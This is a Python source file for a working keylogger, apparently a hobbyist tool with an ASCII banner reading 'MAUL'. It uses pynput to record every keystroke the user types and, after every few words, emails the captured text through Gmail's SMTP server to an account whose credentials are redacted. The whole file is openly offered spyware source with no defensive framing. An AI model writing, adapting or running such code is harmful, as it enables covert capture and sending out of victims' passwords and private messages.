import getpass
import smtplib

from pynput.keyboard import Key, Listener

email = 'redacted'
password = 'redacted'
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)
print(''' .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. |
| | ____    ____ | || |      __      | || | _____  _____ | || |   _____      | |
| ||_   \  /   _|| || |     /  \     | || ||_   _||_   _|| || |  |_   _|     | |
| |  |   \/   |  | || |    / /\ \    | || |  | |    | |  | || |    | |       | |
| |  | |\  /| |  | || |   / ____ \   | || |  | '    ' |  | || |    | |   _   | |
| | _| |_\/_| |_ | || | _/ /    \ \_ | || |   \ `--' /   | || |   _| |__/ |  | |
| ||_____||_____|| || ||____|  |____|| || |    `.__.'    | || |  |________|  | |
| |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------' ''')

full_log = ''
word = ''
email_char = 10

def on_press(key):
    global word
    global full_log
    global email
    global email_char
    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) >= email_char:
            send_log()
            full_log = ''
    elif key == Key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char
    if key == Key.esc:
        return False

def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )

with Listener(on_press=on_press) as listener:
    listener.join()
